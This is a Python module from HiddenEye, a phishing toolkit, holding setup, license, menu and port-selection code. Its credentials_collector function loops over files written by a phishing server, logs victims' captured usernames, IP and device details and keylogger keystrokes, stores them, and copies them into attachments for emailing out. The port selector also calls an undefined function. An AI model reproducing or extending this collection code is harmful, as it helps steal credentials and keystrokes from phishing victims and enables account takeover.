#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#

from Defs.ImportManager.unsorted_will_be_replaced import requests, getuid, platform_os, run_command, try_to_run_command, wait, chmod, stat, pathlib_Path, copyfile, socket
import Defs.ThemeManager.theme as theme
import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
import Defs.ActionManager.Server.server_runner as server_runner
import Defs.LocalizationManager.lang_action_manager.lang_simple_informant as localization
import Defs.LocalizationManager.lang_global_usage as global_localization

default_palette = theme.default_palette


def license_handler():
    eula = pathlib_Path("eula.txt")
    
    if eula.exists():
        eula = eula.open('r')
        with open('eula.txt', 'r') as f:
            if 'eula = True' in f.read():
                print('Found your license agreement, proceeding...')
                return True
            else:
                print('Please read and accept license.')
                return False
    else:
        eula.touch(mode=0o777, exist_ok=True)
        eula = open('eula.txt', 'w')
        eula.write(localization.write_eula + "eula = False")
        eula.close()
        print('Please accept EULA.')
        return False


def exit_message(port = 80):  # Message when HiddenEye exit
    choice = input(localization.lang_exit_message["choice"])
    choice.lower()
    if choice == 'r':
        run_command(['sudo', 'python3', 'HiddenEye.py'])
    elif choice == 'm':
        email_prompt.captured_data_email_confirmation(port)
    elif choice == 's':
        server_runner.server_selection(port)
    elif choice == 'x':
        run_command('clear')
        print(global_localization.hidden_eye_logo)
        print('                             ' + global_localization.by_darksec)
        print('                       ' + global_localization.official_website_link)
        print(localization.lang_exit_message["help_to_improve_this_tool"])
        print(localization.lang_exit_message["tell_if_page_got_broken"])
        print(localization.lang_exit_message["make_your_pull_request_or_issue"])
        print(localization.lang_exit_message["small_disclaimer_suggestion"])
        print(localization.lang_exit_message["forum_suggestion"])
        print(localization.lang_exit_message["financial_support"])
        print(localization.lang_exit_message["thank_you"])
    else:
        run_command('clear')
        return exit_message(port)

def terms_of_service_message():  # menu where user select what they wanna use
    # Terms Of Service
   # print("\n\n\n              {1}WITH GREAT {0}POWER {2}- {1}COMES GREAT {0}RESPONSIBILITY      ".format(red, purple, blue))
    
    #if input("\n\n\n\n{2}[{1}!{2}]{3} Do you agree to use this tool for educational/testing purposes only? {1}({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(default_palette[2], default_palette[4], default_palette[0], orange)).upper() != 'Y':
    #    run_command('clear')
    #    print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(default_palette[0], default_palette[4]))
    #    exit()
    agreement = license_handler()
    if not agreement:
        print(localization.lang_terms_of_service_message["GPL_3.0"])
        print(localization.lang_terms_of_service_message["great_power_great_responsibility"])
        print(localization.lang_terms_of_service_message["do_you_accept_license"])
        print(localization.lang_terms_of_service_message["enter_this_to_confirm"])
        agreement = input(global_localization.input_line)
        if localization.text_to_confirm_license not in agreement:
            print(localization.lang_terms_of_service_message["you_are_not_allowed"])
            exit()
        else:
            eula = open('eula.txt', 'w')
            eula.write(localization.write_eula  +"eula = True")
            eula.close()
            return True
    else:
        return True
            
def module_loading_message(module):  # This one just show text..
    print(localization.lang_module_loading_message["select_any_mode"])


def credentials_collector(port):

    print(localization.lang_credentials_collector["waiting_for_interaction"])
    while True:
        with open('Server/www/usernames.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer(localization.lang_credentials_collector["credentials_found"] + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines))
                #run_command("touch Server/CapturedData/usernames.txt 
                pathlib_Path("Server/CapturedData/usernames.txt").touch(mode=0o777, exist_ok=True)
                
                # && cat Server/www/usernames.txt >> Server/CapturedData/usernames.txt 
                captured_usernames = open('Server/CapturedData/usernames.txt', 'a')
                new_usernames = open('Server/www/usernames.txt')
                captured_usernames.write(new_usernames.read())
                new_usernames.close()
                captured_usernames.close()
                # && cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt 
                copyfile('Server/CapturedData/usernames.txt', 'Defs/FeatureManager/EmailManager/attachments/usernames.txt')

                # && echo -n '' > Server/www/usernames.txt")
                new_usernames = open('Server/www/usernames.txt', 'w')
                new_usernames.write('')
                new_usernames.close()

        with open('Server/www/ip.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer(localization.lang_credentials_collector["device_details_found"] + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines))
                #run_command('touch Server/CapturedData/ip.txt 
                pathlib_Path("Server/CapturedData/ip.txt").touch(mode=0o777, exist_ok=True)
                # && cat Server/www/ip.txt >> Server/CapturedData/ip.txt 
                captured_ips = open('Server/CapturedData/ip.txt', 'a')
                new_ips = open('Server/www/ip.txt')
                captured_ips.write(new_ips.read())
                new_ips.close()
                captured_ips.close()
                # && cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt 
                copyfile('Server/CapturedData/ip.txt', 'Defs/FeatureManager/EmailManager/attachments/ip.txt')
                # && rm -rf Server/www/ip.txt 
                new_ips = open('Server/www/ip.txt', 'w')
                # && touch Server/www/ip.txt')
                new_ips.write('')
                new_ips.close()


        creds.close()

        with open('Server/www/KeyloggerData.txt') as creds:
            lines = creds.read().rstrip()
            if len(lines) != 0:
                log_writer(global_localization.line_of_dots)
                log_writer(localization.lang_credentials_collector["getting_pressed_keys"] + "{0}{2}{1}".format(default_palette[2], default_palette[3], lines))
                #run_command('touch Server/CapturedData/KeyloggerData.txt 
                pathlib_Path('Server/CapturedData/KeyloggerData.txt').touch(mode=0o777, exist_ok=True)
                # && cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt
                captured_keys = open('Server/CapturedData/KeyloggerData.txt', 'a')
                new_keys = open('Server/www/KeyloggerData.txt')
                captured_keys.write(new_keys.read())
                new_keys.close()
                captured_keys.close()
                # && cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt 
                copyfile('Server/CapturedData/KeyloggerData.txt', 'Defs/FeatureManager/EmailManager/attachments/KeyloggerData.txt')
                # && rm -rf Server/www/KeyloggerData.txt 
                new_keys = open('Server/www/KeyloggerData.txt', 'w')
                # && touch Server/www/KeyloggerData.txt')
                new_keys.write('')
                new_keys.close()

                log_writer(global_localization.line_of_dots)

        creds.close()

def log_writer(ctx):  # Writing log
    logFile = open("log.txt", "w")
    logFile.write(ctx.replace(default_palette[0], "").replace(default_palette[1], "").replace(default_palette[2], "").replace(default_palette[3], "").replace(default_palette[4], "") + "\n")
    print(ctx)

def port_selector():  # Question where user must select port
    run_command('clear')
    #print('''
    #    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
    #    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
    #    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
    #    {0}http://github.com/darksecdevelopers
    #    {0}** BY:DARKSEC ** \n\n-------------------------------
    # )
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(global_localization.line_of_dots)
    print(localization.lang_port_selector["website_port_selection"])
    print(localization.lang_port_selector["select_any_available_port"])
    print(localization.lang_port_selector["port_suggestion"])
    choice = input(global_localization.input_line)
    try:
        if int(choice) > 65535 or int(choice) < 1:
            return selectPort()
        else:
            return choice
    except:
        return port_selector()

def remove_readonly(func, path, _):
    "Clear the readonly bit"
    chmod(path, stat.S_IWRITE)
    func(path)


def global_message():
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(global_localization.line_of_dots)


def verify_connection(host='https://google.com'):  # Connection check
    run_command('clear')
    try:
        req = requests.get(host, timeout=25)
        if req.status_code == 200:
            print(localization.lang_verify_connection["connected"])
            pass
    except:
        print(localization.lang_verify_connection["disconnected"])
        print(global_localization.hidden_eye_logo)
        print(localization.lang_verify_connection["verify_your_connection"])
        exit()

def check_permissions():

    if platform_os() != "Windows":
        if getuid() == 0:
            print(localization.lang_check_permissions["permissions_granted"])
        else:
            print(localization.lang_check_permissions["permissions_denied"])
            exit()
    else:
        print(localization.lang_check_permissions["windows_warning"])
        exit()

def check_php():
    try:
        try_to_run_command(['php', '-v'])
        print(localization.lang_check_php["found"])
    except:
        print(localization.lang_check_php["not-found"])
        exit()
